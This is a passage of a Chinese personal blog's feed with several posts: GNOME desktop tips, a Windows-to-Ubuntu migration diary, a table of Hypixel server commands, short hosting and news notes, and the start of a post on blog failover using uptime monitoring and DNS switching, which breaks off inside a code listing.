Win 键，它有许多你不知道的妙用</p><h4 id="调节窗口位置"><a href="#调节窗口位置" class="headerlink" title="调节窗口位置"></a>调节窗口位置</h4><p>你通常要按住窗口“眉毛”来拖动窗口。</p><p>但假如你按住 Spuer 键，你就可以在窗口的任何地方按住来拖动窗口</p><h4 id="调节窗口大小"><a href="#调节窗口大小" class="headerlink" title="调节窗口大小"></a>调节窗口大小</h4><p>同理。你通常要按住窗口边缘来调节窗口大小。</p><p>但假如你按住 Spuer 键，再按鼠标中键，你就可以任何接近窗口边缘的地方按住来拖动窗口。</p><h4 id="其它快捷键"><a href="#其它快捷键" class="headerlink" title="其它快捷键"></a>其它快捷键</h4><p>单击 Super 进入“活动”页</p><p>双击 Super 进入全部应用页</p><p>Super + V 打开顶栏 通知&#x2F;日历。然后按 Delete 删除通知</p><p>Super + &#96;（TAB 上面）切换应用</p><h3 id="打开一个应用的多个窗口"><a href="#打开一个应用的多个窗口" class="headerlink" title="打开一个应用的多个窗口"></a>打开一个应用的多个窗口</h3><p>通常情况下，打开一个应用的多个窗口要右键，选择 新建窗口。但你也可以按住 Ctrl 再点击应用，就会直接再打开一个</p><h3 id="拖放应用"><a href="#拖放应用" class="headerlink" title="拖放应用"></a>拖放应用</h3><p>在“活动”页或全部应用页中，你可以直接把应用图标拖到桌面上，就能在对应位置打开</p><h3 id="音量调节"><a href="#音量调节" class="headerlink" title="音量调节"></a>音量调节</h3><p>现在许多键盘上都有独立的音量调节按钮，这确实很方便。但你知道吗？通常情况下通过键盘按钮的音量调节是一次 6%，许多时候这真的很麻烦。</p><p>还好，你可以<strong>按住 Shift</strong> 再调节音量。这时的调节粒度就成了 1%。</p><p>你还可以将鼠标悬停在顶栏的音量图标处，滚动鼠标滚轮，这也能调节音量。</p><h3 id="切换工作区"><a href="#切换工作区" class="headerlink" title="切换工作区"></a>切换工作区</h3><p>你不仅可以用 Ctrl + Alt + 方向键 来切换左右工作区，还可以将鼠标悬停在 Dock 栏上滚动鼠标滚轮来切换工作区。</p><h3 id="平滑滚动"><a href="#平滑滚动" class="headerlink" title="平滑滚动"></a>平滑滚动</h3><p>通常情况下 GNOME 中应用滚动是没有平滑滚动的。但如果你将鼠标悬停在滚动条上时，滚动滚轮（不是拖动滚动条）你就能得到一个优雅的平滑滚动效果。它的滚动步长通常比直接滚动要大（也许是翻页滚动）</p><h3 id="快速打开系统监视器"><a href="#快速打开系统监视器" class="headerlink" title="快速打开系统监视器"></a>快速打开系统监视器</h3><p>GNOME 中的系统监视器类似 Windows 中的任务管理器。你可以快速结束卡死的进程。但真到了系统卡死的时候再找到系统监视器真的太慢了。你其实可以设置一个快捷键来快速打开系统监视器。</p><p><img src="https://cdn.jiecs.top/img/2023/02/%E6%88%AA%E5%9B%BE%202023-02-06%2017-47-45.webp" alt="自定义快捷键"></p><p><code>gnome-system-monitor</code> 就是系统监视器的命令。</p><p>BTW：你还可以用 <code>xkill</code> 来强制关闭某个窗口，这不止适用于 GNOME。</p><h2 id="Dconf"><a href="#Dconf" class="headerlink" title="Dconf"></a>Dconf</h2><p>GNOME 中有一项名为 Dconf 的配置系统，类似 Windows 中的注册表。</p><p>你可以安装 Dconf GUI 编辑器来编辑，<code>dconf reset -f /</code> 来恢复默认</p><p>它允许你更改很多东西，这里先不展开讲了。</p>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>技术</tag>
      
      <tag>教程</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自由的 Linux，好用吗？- Windows 换到 Ubuntu 遇到的几个问题和提示</title>
    <link href="/archives/cdffddf1/"/>
    <url>/archives/cdffddf1/</url>
    
    <content type="html"><![CDATA[<p>这篇文章依据 Ubuntu 22.04 - 22.10 和默认 GNOME 桌面所写。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>要装 Linux 首先肯定是要选个发行版。主要的发行版其实就那么几个，我选的是 Ubuntu。它有庞大的社区，对新手友好，而且默认的 GNOME 桌面也很好看。我之前还有一些 Ubuntu 包管理器 apt 的使用经验。Ubuntu 对我来说是一个必定的选择。</p><p>启动进 U 盘，有 LiveUSB 系统，你可以在这时候试用 Ubuntu，一切功能都几乎和你安装后的一样，这时是你检查各种驱动和兼容性的最佳时机，不过要注意 <strong>LiveUSB 是不保留你的数据的</strong>。相比 Windows，Ubuntu 的安装友好很多，界面风格都是相当统一的，不像 Windows 到现在安装界面还有一堆远古产物。分区相当直观，你可以选择与 Windows 共存，不放心也可以自己分区，LiveUSB 自带简单的分区工具。安装完成重启时甚至会提醒你“移除安装中间件，然后按 ENTER”，可以说是十分贴心。</p><p>安装完也没有微软那冗长的 OOBE，只有可以跳过的简单欢迎。安装过程是出乎意料的顺利，完全可以说<strong>比 Windows 还简单</strong>。</p><h2 id="大问题"><a href="#大问题" class="headerlink" title="大问题"></a>大问题</h2><h3 id="显示器"><a href="#显示器" class="headerlink" title="显示器"></a>显示器</h3><p>安装完遇到的第一个问题就是显示器的刷新率。我的显示器宣传是支持 2k165hz 的，但可能是因为线缆或者显卡什么的，Windows 里就只能达到 2k60 或 1080p120，我是用了 Nivdia 显卡驱动里自定义分辨率的功能“超频”到了 2k100 勉强用。但在 Ubuntu 上，无论我用什么工具都无济于事，成天爬网也没啥成果，试了什么 xrandr 都不行。现在<strong>只能将就用 60hz</strong>。</p><h3 id="鼠标驱动"><a href="#鼠标驱动" class="headerlink" title="鼠标驱动"></a>鼠标驱动</h3><p>我用的是 ROCCAT Kone Pure Owl-Eye 鼠标，有个 ROCCAT Swarm 驱动，可以配置 RGB、各个按键的功能等。但那玩意<strong>不支持 Linux</strong>，而且就算我用 Wine 运行了，鼠标宏也显然没法用。我试了各种社区的方案，包括 <a href="https://sourceforge.net/projects/roccat/">ROCCAT Tools</a>、<a href="https://github.com/libratbag/piper">Piper</a> 都在编译或运行的时候遇到这样那样的问题。现在只能用之前的板载配置。</p><h3 id="输入法"><a href="#输入法" class="headerlink" title="输入法"></a>输入法</h3><p>Ubuntu 自带的中文输入法是 <a href="https://github.com/libpinyin/ibus-libpinyin">ibus-libpinyin</a>，虽然确实很好看吧，但因为各种原因<strong>真的很难用</strong></p><p>兼容性差、加载慢、经常崩溃、没有良好的词典管理、词频不合理、光标乱跳等等等等</p><p>一堆问题（那些候选词真的就不是自己想打的，词典再多也没用）。中间也换过 Fcitx4、5，好用是好用了，但也真的丑。想再换回 IBus，又没法用了，不管怎样就是没反应，不出候选词栏。我重装了各种东西都没用，还是只能重装了系统。最后还是为了颜值用回 ibus-libpinyin，就是极度依赖云词典。</p><h2 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h2><h3 id="Flatpak-字体"><a href="#Flatpak-字体" class="headerlink" title="Flatpak 字体"></a>Flatpak 字体</h3><p>Ubuntu 一个一直为人诟病的问题就是那商业化的 Snaps，我就照着装了 Flatpak。但当我试着装点应用时就发现 Flatpak 的字体是咋回事？？</p><p><img src="https://cdn.jiecs.top/img/2023/01/%E6%88%AA%E5%9B%BE_2023-01-24_20-44-04.png" alt="Betterbird 的字体扭曲"></p><p>看了看这还是个已知问题：<a href="https://github.com/flatpak/flatpak/issues/4571">[Bug]: Fonts look terrible #4571</a>。这个 21 年的问题 tm 到现在都<strong>一点变化没有</strong>，换一个灯泡需要多少GNU&#x2F;Linux用户？</p><h3 id="挂起-休眠支持"><a href="#挂起-休眠支持" class="headerlink" title="挂起&#x2F;休眠支持"></a>挂起&#x2F;休眠支持</h3><p>Ubuntu 中没有 休眠 支持，你只能自己改。但就算它自带的“挂起”也有问题。主板是 ASUS PRIME H310M-K</p><ul><li>要么是 挂起 的时候除了屏幕、USB 设备黑，啥都不黑（但电源“哒”一声能听到）</li><li>要么是 唤醒 时除了屏幕不亮，啥都亮（大写锁定没反应，切换 tty 没用）</li></ul><h3 id="Wayland-支持"><a href="#Wayland-支持" class="headerlink" title="Wayland 支持"></a>Wayland 支持</h3><p>Ubtuntu 虽然已经提供了良好的 Wayland 支持，但不知道为啥我用 Wayland 就一堆问题。</p><ul><li>Firefox 里上下滚动回跳</li><li>重设 设置应用（gnome-control-center）大小时黑边框</li><li>打字重复键、没法用“夜灯”</li></ul><p>等等</p><p>这些问题截图录屏都表现不太出来。但这也不是不能用，换到 X11 就行了。</p><h3 id="NTFS-支持"><a href="#NTFS-支持" class="headerlink" title="NTFS 支持"></a>NTFS 支持</h3><p>虽然 Linux Kernel 早就支持 NTFS 了，但不知道为啥我在用自带 文件应用（nautilus）访问 Windows 磁盘时，提示 <code>wrong fs type, bad option, bad superblock on /dev/sda5, missing codepage or helper program, or other error</code>，但我自己用 mount 挂载时又啥问题没有。我装了 nfts-3g 运行 ntfsfix 之后是好了，但只要我卸载 ntfs-3g 就不行，在我重装系统后它又莫名其妙的好了。</p><h3 id="GNOME-其它杂七杂八的问题"><a href="#GNOME-其它杂七杂八的问题" class="headerlink" title="GNOME 其它杂七杂八的问题"></a>GNOME 其它杂七杂八的问题</h3><p>Ubuntu 的 GNOME 还有一些其它各种小问题，比如 Dock 在侧边时没法把鼠标碰到底来触发 Dash 应用列表，要往上偏移一点。还有在 Dock 用滚轮切换虚拟桌面时，虚拟桌面指示器没有白亮点。前者在 Ubuntu 22.10 附带的 GNOME 43 已经修了，后者我相信之后也会修复。</p><h3 id="Firefox-兼容性、功能性"><a href="#Firefox-兼容性、功能性" class="headerlink" title="Firefox 兼容性、功能性"></a>Firefox 兼容性、功能性</h3><p>Linux 桌面系统一般都是搭配 Firefox，但 Firefox 也真的不好用。首先它经常莫名其妙地滚动掉帧，或者菜单打不开。重启之后却又恢复正常。再说功能性，Edge 的垂直标签页真的用了就离不开，而 Firefox 就没有。Firefox 的 DevTools 也不好用</p><ul><li>没有 LightHouse，Firefox Profiler 性能工具也不够直观</li><li>管理 Service Workers 的相关功能少到捉急</li><li>存储空间必须一项一项删不能清空</li></ul><p>要是换到 Chromium，那功能更少。换到 Edge，那还是离不开微软的闭源软件。</p><h3 id="自动蓝牙连接"><a href="#自动蓝牙连接" class="headerlink" title="自动蓝牙连接"></a>自动蓝牙连接</h3><p>Ubuntu 蓝牙驱动是没问题，配对了也能用，但每次开启&#x2F;登录时它都不会自动连接。我设置了个自己的启动任务可以解决，更新到 Ubuntu 22.10 后，它也自带自动连接了，就是在登录页面里会连接一次，然后登录时断开，登录上再连接，频繁开关比较烦。</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><h3 id="界面风格的高度统一"><a href="#界面风格的高度统一" class="headerlink" title="界面风格的高度统一"></a>界面风格的高度统一</h3><p>说了这么多 Linux 的问题，Linux 桌面也是有明显的优点的。最明显的优点就是那高度统一的界面风格。无论你是多少年前的远古程序，在 Linux 上的界面也<strong>都不会太过时</strong>，我相信肯定不止 Ubuntu 用的 GNOME 是这样，什么 KDE、XFCE 等等桌面环境都是。虽然有 GNOME 43、42 之类的差距 ，但整体风格还是统一的，即使是界面不太一样的三方应用感觉也能很好地融入其中。不像 Windows 真的天差地别。</p><h3 id="高自定义性"><a href="#高自定义性" class="headerlink" title="高自定义性"></a>高自定义性</h3><p>GNOME 自带快捷键管理，能设置自定义快捷键任务，还能像添加浏览器插件一样添加桌面插件。KDE 之类的更不用说了，桌面能变成任何你喜欢的样子。（虽然我还是喜欢 GNOME 默认的）</p><h3 id="实用窗口管理"><a href="#实用窗口管理" class="headerlink" title="实用窗口管理"></a>实用窗口管理</h3><p>GNOME 自带很多实用的窗口管理功能，可以右键窗口眉毛设置。比如“置顶”就是 Windows 里的 Always on Top。还有“全屏”能让任何应用从系统层面实现无边框全屏。</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="稳定性"><a href="#稳定性" class="headerlink" title="稳定性"></a>稳定性</h3><p>关于稳定性，很多人都说 Linux 是服务器用的系统，怎么怎么稳定啥的。但依我看，Linux 在服务器上可能确实比 Windows 稳定，但至少在桌面环境我完全不这么认为。Ubuntu 三天两头跳出来：<br><img src="https://cdn.jiecs.top/img/2023/01/%E6%88%AA%E5%9B%BE_2023-01-24_19-14-34.png" alt="对不起，Ubuntu 22.10 出现了内部错误"><br>虽然大多数时候不都是真的关键问题，但有时也总会有啥啥崩溃闪退，有够烦的。Windows 一直被诟病不稳定，但我用好长时间 Beta Channel 也真的没遇到什么致命问题，更没有蓝屏。Windows 至少不会因为你卸载 Python 就崩溃，甚至即使你删了 System32，也能自动修复。</p><h3 id="开发友好性"><a href="#开发友好性" class="headerlink" title="开发友好性"></a>开发友好性</h3><p>很多人也说开发者适合用 Linux，但我是真没觉得。首先 JetBrains 系 IDE 的输入法光标定位有问题，<a href="https://youtrack.jetbrains.com/issue/JBR-2460/Wrong-position-of-input-window-and-no-input-preview-with-fcitx-and-ubuntu-13.04">这个问题</a>已经有 9 年的历史了，现在的消息是说会在 2023.1 版本里修复。还有一些只能在 Linux 构建的程序可能 Linux 确实有优势，但大多数情况，Linux 能做的 Windows 都能做，而且做得更好。</p><h3 id="游戏"><a href="#游戏" class="headerlink" title="游戏"></a>游戏</h3><p>游戏可能是对我影响最小的了。除了 Minecraft 我真的不咋玩啥别的游戏，Minecraft 很多 PVP Client 在 Linux 也都能用（除了  Feather），以下是遇到的几个问题</p><ul><li>Badlion 的无边框全屏在显示器设置缩放了的情况下只有四分之一屏幕。或者屏幕任务栏等不会隐藏（可以用系统设置全屏快捷键，或者不用无边框全屏）</li><li>HMCL 的缩放没法自定义，而且很小</li><li>游戏内没法打中文</li><li>没法玩基岩版，社区方案只支持登录 Play 账号</li></ul><p>其实就算你哪天朋友要你玩啥游戏也基本不用担心，得益于 V 社的倾情贡献，Linux 的游戏生态已经相当好了。你可以从 <a href="https://www.protondb.com/">ProtonDB</a> 来看各种游戏的支持情况</p><h3 id="软件包管理器"><a href="#软件包管理器" class="headerlink" title="软件包管理器"></a>软件包管理器</h3><p>很多人说 Linux 的软件包管理器吊打 Windows 什么的，不用从官网下载应用确实方便。但 Ubuntu 自带的存储库很多软件还都很老的版本，我遇到的有上文提到的 ibus-libpinyin、piper，还有 GNOME 的身份验证器等，导致很多时候你其实还得自己构建（然后遇到一大堆依赖问题）。这可能由多种因素造成，不知道其它发行版有没有这问题。</p><h3 id="软件生态和驱动"><a href="#软件生态和驱动" class="headerlink" title="软件生态和驱动"></a>软件生态和驱动</h3><p>很多人都说 Linux 的软件生态差，但我真没感觉到这点，甚至很多国产软件在 Linux 都更纯净、有更好的表现。驱动也没任何问题。我的蓝牙适配器是很久之前买的，驱动都要找淘宝客服要，远古的不行。结果在 Ubuntu 我啥都没配置就能用。</p><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><h3 id="不要跟着“教程”复制粘贴命令"><a href="#不要跟着“教程”复制粘贴命令" class="headerlink" title="不要跟着“教程”复制粘贴命令"></a>不要跟着“教程”复制粘贴命令</h3><p>不要只是跟着搜索引擎中很多“教程”复制粘贴命令，<strong>即使是官方教程文档</strong>。你最好要知道这些命令的作用，并确保自己能尽量恢复这些命令做的事。搜索引擎中的教程可能是有用的，但也需要你辨析它的可靠性，而不是一味复制粘贴，这是很危险的。就算你真的难以理解其中一些内容，你也要确保它的来源可靠、反映积极、有时效性。例如 AskUbuntu、StackOverflow 等的可靠性就远大于你从未听说过的、没有评论功能、界面远古的网站。</p><p>很多官方教程文档提供的内容虽然是可靠的，但如果你它不知道它们干了什么，这也仍然危险</p><p>类似的，不要依赖“安装脚本”，它很可能干了很多你不知道的事。如果这个程序如果有官方提供的安装脚本，你也应至少熟悉它的流程并知道如何在卸载它时卸载干净。（尤其是 systemd、.desktop 之类的）</p><h3 id="使用值得信任的软件"><a href="#使用值得信任的软件" class="headerlink" title="使用值得信任的软件"></a>使用值得信任的软件</h3><p>即使你知道这软件是“开源”的，但这也不意味着它值得信任。符合以下标准的就应该注意一下</p><ul><li>README 废话连篇的</li><li>Release 只有一两项且是手工构建的</li><li>stars 10-20</li></ul><h3 id="构建大型程序时用虚拟环境"><a href="#构建大型程序时用虚拟环境" class="headerlink" title="构建大型程序时用虚拟环境"></a>构建大型程序时用虚拟环境</h3><p>这非常重要，构建大型程序通常需要很多依赖，安装后可能很难干净地卸载。也很可能在清理依赖时破环了系统组件，有时你很难分辨出哪些是系统自带或被其它程序依赖的，哪些是只有这个程序需要的。Docker 之类的虚拟环境能在构建它们时不脏了你的主机环境，出现问题也能更好复现.</p><h3 id="不要为了某件小事情在上面耗费大量时间"><a href="#不要为了某件小事情在上面耗费大量时间" class="headerlink" title="不要为了某件小事情在上面耗费大量时间"></a>不要为了某件小事情在上面耗费大量时间</h3><p>Linux 中，解决很多小问题所耗费的时间很可能远远超出你的预估，或（几乎）根本无法完成。很有可能这就是个已知问题，或在一段时间后会自己修复。只要这个问题不是致命的就忍忍呗，不要把时间浪费在系统上。</p>]]></content>
    
    
    <categories>
      
      <category>一些日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>技术</tag>
      
      <tag>教程</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hypixel 常用命令</title>
    <link href="/archives/6ca856d/"/>
    <url>/archives/6ca856d/</url>
    
    <content type="html"><![CDATA[<p>Hypixel 中大多数操作都可以用 gui 完成，但很多关于聊天频道相关的功能还是要指令。而且在游戏时指令很多时候比你点 gui 快得多</p><p>命令不全，主要完善我在其它文章中没看到却很有用的命令。可能有错误</p><p>以下指令中 &lt; &gt; 的参数必填，[ ] 的参数选填。多个别名间用 ; 隔开</p><h2 id="社交"><a href="#社交" class="headerlink" title="社交"></a>社交</h2><table><thead><tr><th>命令</th><th>描述</th><th>别名</th></tr></thead><tbody><tr><td>&#x2F;chat all</td><td>切换聊天频道为 全部</td><td>&#x2F;chat a</td></tr><tr><td>&#x2F;chat party</td><td>切换聊天频道为 组队</td><td>&#x2F;chat p</td></tr><tr><td>&#x2F;chat guild</td><td>切换聊天频道为 公会</td><td>&#x2F;chat g</td></tr><tr><td>&#x2F;chat officer</td><td>切换聊天频道为 公会管理</td><td>&#x2F;chat o</td></tr><tr><td>&#x2F;party chat &lt;msg&gt;</td><td>在 组队 中发送单条消息</td><td>&#x2F;pchat ; &#x2F;pc</td></tr><tr><td>&#x2F;guild chat &lt;msg&gt;</td><td>在 公会 中发送单条消息</td><td>&#x2F;gchat ; &#x2F;gc</td></tr><tr><td>&#x2F;guild officerchat &lt;msg&gt;</td><td>在 公会管理 中发送单条消息</td><td>&#x2F;ochat ; &#x2F;oc</td></tr><tr><td>&#x2F;shout &lt;msg&gt;</td><td>在分队的游戏中全局喊话（默认就是仅队内）</td><td></td></tr><tr><td>&#x2F;msg &lt;player&gt; &lt;msg&gt;</td><td>私信指定玩家（对方可设置权限）</td><td>&#x2F;tell ; &#x2F;whisper ; &#x2F;w</td></tr><tr><td>&#x2F;reply &lt;msg&gt;</td><td>回复最近的私信</td><td>&#x2F;r</td></tr><tr><td>&#x2F;tpa &lt;player&gt; [player]</td><td>请求与指定玩家传送，需要双方在同个大厅<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="你可以使用 /friend list 或 /fl 来获取好友列表，并直接点击玩家名来跨大厅传送">[1]</span></a></sup></td><td></td></tr><tr><td>&#x2F;tpa accept [player]</td><td>接受指定玩家的传送请求</td><td></td></tr></tbody></table><h2 id="大厅"><a href="#大厅" class="headerlink" title="大厅"></a>大厅</h2><table><thead><tr><th>命令</th><th>描述</th><th>别名</th></tr></thead><tbody><tr><td>&#x2F;lobby [game]</td><td>进入指定游戏大厅。[game] 须缩写<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="a = ArcadeGames(街机) ; bw = BedWars(起床) ; sw = SkyWays(空岛) 等">[2]</span></a></sup></td><td>&#x2F;hub ; &#x2F;leave ; &#x2F;l</td></tr><tr><td>&#x2F;main</td><td>返回主大厅</td><td>&#x2F;spawn</td></tr><tr><td>&#x2F;stuck</td><td>传送回大厅初始位置而不切换大厅</td><td></td></tr><tr><td>&#x2F;party chat &lt;msg&gt;</td><td>在 组队 中发送单条消息</td><td>&#x2F;pc</td></tr><tr><td>&#x2F;guild chat &lt;msg&gt;</td><td>在 公会 中发送单条消息</td><td>&#x2F;gc</td></tr></tbody></table><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><table><thead><tr><th>命令</th><th>描述</th><th>别名</th></tr></thead><tbody><tr><td>&#x2F;trackpvp</td><td>在决斗游戏中追踪对方的延迟、失误率等</td><td>​&#x2F;trackcombat ; &#x2F;pvpinfo</td></tr><tr><td>&#x2F;tip [player] [game]</td><td>给指定玩家在指定大厅打赏，即使对方没有开启 Network Boosters。需要对方在线</td><td></td></tr><tr><td>&#x2F;tip all</td><td>打赏全部开启了 Network Boosters 的玩家</td><td>&#x2F;tipall</td></tr><tr><td>&#x2F;rejoin</td><td>返回你刚退出的游戏</td><td>&#x2F;rej ; &#x2F;back</td></tr><tr><td>&#x2F;report &lt;player&gt; [type]</td><td>举报玩家。也可直接在 type 中输入举报原因<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="ka = 杀戮 ; fly = 飞行 ; reach = 长臂猿 ; ac = 连点">[3]</span></a></sup>而不打开举报书。举报书中可进行聊天内容举报</td><td>&#x2F;wdr ; &#x2F;watchdogreport</td></tr><tr><td>&#x2F;main</td><td>返回主大厅</td><td>&#x2F;spawn</td></tr><tr><td>&#x2F;fw</td><td>在头顶放烟花，需要 Rank</td><td></td></tr><tr><td>&#x2F;getoffmyface</td><td>让骑在你身上的玩家下来</td><td></td></tr></tbody></table><h2 id="小提示"><a href="#小提示" class="headerlink" title="小提示"></a>小提示</h2><ol><li><p>你可以连接到 stuck.hypixel.net 并换回来解决一些奇奇怪怪的网络问题。如资源包无法加载、无法退出 <a href="https://hypixel.fandom.com/wiki/Limbo">Limbo</a></p></li><li><p>时不时运行 &#x2F;tip all 或 &#x2F;tipall 来打赏所有开启了 Network Boosters 的玩家，这对你没有任何损失，反而会收获一些经验和硬币。这对双方都有好处！可以使用 <a href="https://autotip.pro/">AutoTip</a> 之类的模组</p></li><li><p>你需要拥有 Rank 才能在大厅中飞行。但不付费也可在出生地右手边的 大厅探险家 处拿到 抓钩 小道具，能在大厅建筑间快速移动，类似飞行</p></li><li><p>&#x2F;r 命令很有用，尤其是当你的朋友私信你而你还在游戏中时，可以快速打出 &#x2F;r k</p></li></ol><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>你可以使用 &#x2F;friend list 或 &#x2F;fl 来获取好友列表，并直接点击玩家名来跨大厅传送<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>a &#x3D; ArcadeGames(街机) ; bw &#x3D; BedWars(起床) ; sw &#x3D; SkyWays(空岛) 等<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span>ka &#x3D; 杀戮 ; fly &#x3D; 飞行 ; reach &#x3D; 长臂猿 ; ac &#x3D; 连点<a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>一些日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Minecraft</tag>
      
      <tag>游戏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>更换托管平台为 Github Pages</title>
    <link href="/archives/8034c1ba/"/>
    <url>/archives/8034c1ba/</url>
    
    <content type="html"><![CDATA[<p>把博客境内外的托管平台都换成 Github Pages 了（当然国内还是套了个百度云加速）。一方面不用再考虑 SSL 证书续签和监控不了国内，一方面能把搜索引擎中大量的 <code>jiesou.github.io</code> 重定向为 <code>www.jiecs.top</code>（之前就做了前端的 JS 重定向，但目前看着作用不大）</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>江泽民逝世</title>
    <link href="/archives/e7973ac4/"/>
    <url>/archives/e7973ac4/</url>
    
    <content type="html"><![CDATA[<style>html {    filter: grayscale(100%);}#hide-text {    color: transparent;}</style><p>🕯</p><p><i id="hide-text">可惜不是你</i></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>零成本的博客高可用多冗余方案</title>
    <link href="/archives/1771d434/"/>
    <url>/archives/1771d434/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我的博客之前一直是部署在 <a href="https://vercel.com/">Vercel</a> 上的，虽然 Vercel 对 SLA 有<a href="https://vercel.com/legal/sla">四个 9</a> 的保证。但出于折腾的心态我还是想给博客上个冗余。我的博客可以同时托管在多个平台上（如 <a href="https://netlify.com/">Netlify</a>），然后在监控到博客异常时自动切换</p><h2 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h2><h3 id="平台选择"><a href="#平台选择" class="headerlink" title="平台选择"></a>平台选择</h3><p>监控平台有很多，经过斟酌我博客选择的是 <a href="https://betteruptime.com/">BetterUptime</a>，免费能 3 分钟一次，附有 StatusPage，界面也比较好看</p><p>不过 BetterUptime 免费是没法设置 WebHook 的，你就没法对事件设置更多自己的操作。但我注意到它支持 Zapier 能设置自己的自定义操作。<a href="https://zapier.com/">Zapier</a> 是一个类似 IFTTT 的平台，更面向企业等。然而很坑的是 Zapier 免费计划照样不支持 WebHook</p><h3 id="Zapier-转发-IFTTT-来执行-WebHook"><a href="#Zapier-转发-IFTTT-来执行-WebHook" class="headerlink" title="Zapier 转发 IFTTT 来执行 WebHook"></a>Zapier 转发 IFTTT 来执行 WebHook</h3><p>总之经过各种摸索，我发现只要 Zapier 能设置通过自己的电子邮箱（授权 Gmail 等）向指定邮箱地址，发出事件的详细邮件消息。你可以在里面设置自己的格式</p><p>并且 <a href="https://ifttt.com/">IFTTT</a> 支持接收来自指定电子邮箱的邮件，<strong>这就能将 Zapier 触发的内容转发到 IFTTT</strong>。你就可以用 IFTTT 进行更多自定义操作，<strong>其中包括 WebHook</strong></p><p>于是我在 Zapier 上弄出了这个自动化流程：</p><p><img src="https://cdn.jiecs.top/img/2022/11/IMG_20221124_223022.webp" alt="Zapier 配置"></p><p>其中 <em><a href="mailto:&#116;&#114;&#x69;&#103;&#x67;&#x65;&#x72;&#x40;&#x61;&#x70;&#x70;&#x6c;&#101;&#x74;&#x2e;&#105;&#102;&#116;&#x74;&#116;&#46;&#99;&#x6f;&#x6d;">trigger@applet.ifttt.com</a></em> 正是 IFTTT 的邮件接受目标地址。然后在 IFTTT 进行相应配置即可：</p><p><img src="https://cdn.jiecs.top/img/2022/11/Screenshot_2022-11-24-18-12-49-185_com.microsoft.emmx.webp" alt="IFTTT 配置"></p><p>IFTTT 的接受邮件触发器可以参考这个<a href="https://ifttt.com/email/triggers/send_ifttt_an_email">文档</a></p><p>IFTTT 的 WebHook 支持各种请求方式，也能通过 body 等方式传递数据。监控侧解决了，就可以将异常信息传递到自己的 API 了，下一步就是自己实现处理异常的 API</p><h2 id="回调-API-实现"><a href="#回调-API-实现" class="headerlink" title="回调 API 实现"></a>回调 API 实现</h2><h3 id="托管平台选择"><a href="#托管平台选择" class="headerlink" title="托管平台选择"></a>托管平台选择</h3><p>API 我本来是打算托管在 <a href="https://workers.dev/">Cloudflare Workers</a> 的。但它的命令行工具 Wrangler CLI 实在太难用了，主要是这个<a href="https://github.com/cloudflare/wrangler2/issues/1732">问题</a>让我基本没法在安卓上开发。我也懒得折腾那么多问题，不如直接换个平台</p><p>我最终选择的是 <a href="https://deta.sh/">Deta.sh</a>，它宣称永远提供免费无限量的 Node.js&#x2F;Python Web 应用请求。虽然相比之下好像没那么靠谱（也没提供 SLA 保证），但综合之下只能选它了</p><p>Deta 的 CLI 还是很好用的。就是本地调试麻烦点，我是用自己的 <code>nodemon</code></p><h3 id="冗余的切换"><a href="#冗余的切换" class="headerlink" title="冗余的切换"></a>冗余的切换</h3><p>要实现高可用，最关键的肯定就是切换冗余。切换镜像网站最直接的方法就是换 DNS 解析。</p><p>我域名用的是阿里云 DNS，他提供了一整套易用免费 DNS 处理的 OpenAPI 以及各语言 SDK。文档在<a href="https://help.aliyun.com/document_detail/29771.html">此处</a>，还有一个很好用的 <a href="https://next.api.aliyun.com/api/Alidns/?lang=NODEJS">在线 API 调试工具</a>（就是移动端体验不咋滴）。API 的密钥是 AccessKey，参考<a href="https://help.aliyun.com/document_detail/116401.html">文档</a>来创建</p><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p>最后，以下是我在 Deta 上部署的完整代码，API 密钥等使用了环境变量，部分内容已隐去，依赖都在开头</p><p>代码仅供参考，具体还是根据你的需求写</p><details><summary>展开完整代码</summary><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 